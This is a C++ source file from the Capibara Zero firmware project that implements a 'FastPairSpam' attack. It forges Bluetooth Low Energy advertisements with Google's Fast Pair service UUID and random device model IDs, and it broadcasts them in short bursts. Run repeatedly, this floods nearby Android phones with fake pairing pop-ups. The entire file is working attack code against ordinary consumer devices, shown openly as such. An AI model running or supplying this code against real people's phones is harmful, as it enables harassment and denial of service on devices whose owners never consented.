/*
 * This file is part of the Capibara zero
 * project(https://capibarazero.github.io/). Copyright (c) 2023 Andrea Canale.
 * Copyright (c) 2023 Spooks4576
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, version 3.
 *
 * This program is distributed in the hope that it will be useful, but
 * WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU
 * General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program. If not, see <http://www.gnu.org/licenses/>.
 */

#include "fast_pair_spam.hpp"

FastPairSpam::FastPairSpam() {
    randomSeed(millis()); // Initialize the random number generator
    pServer = NimBLEDevice::createServer();
    pAdvertising = pServer->getAdvertising();
}

FastPairSpam::~FastPairSpam() { pServer->stopAdvertising(); }

NimBLEAdvertisementData FastPairSpam::getOAdvertisementData() {
    NimBLEAdvertisementData randomAdvertisementData = NimBLEAdvertisementData();
    uint8_t packet[14];
    uint8_t i = 0;
    packet[i++] = 0x02; // TX Power Field Length
    packet[i++] = 0x0a; // TX Power Type
    packet[i++] = 0x00; // Power -1
    packet[i++] = 0x03; // UUID Field Length
    packet[i++] = 0x03; // Service Class UUID
    packet[i++] = 0x2c; // Google UUID
    packet[i++] = 0xfe; // Service Data UUID
    packet[i++] = 0x06; // Service Data Field Length
    packet[i++] = 0x16; // Service Data Field Type
    packet[i++] = 0x2c; // Google UUID(16 bits)
    packet[i++] = 0xfe; // Google UUID (16 bits)
    FastPairDevice random_device = devices[random(532)];
    memcpy(&packet[i], &random_device.id, 3); // Service Data
    randomAdvertisementData.addData(std::string((char *)packet, 14));
    return randomAdvertisementData;
}

void FastPairSpam::attack() {
  delay(40);
  NimBLEAdvertisementData advertisementData = getOAdvertisementData();
  pAdvertising->setAdvertisementData(advertisementData);
  pAdvertising->start();
  delay(20);
  pAdvertising->stop();
}
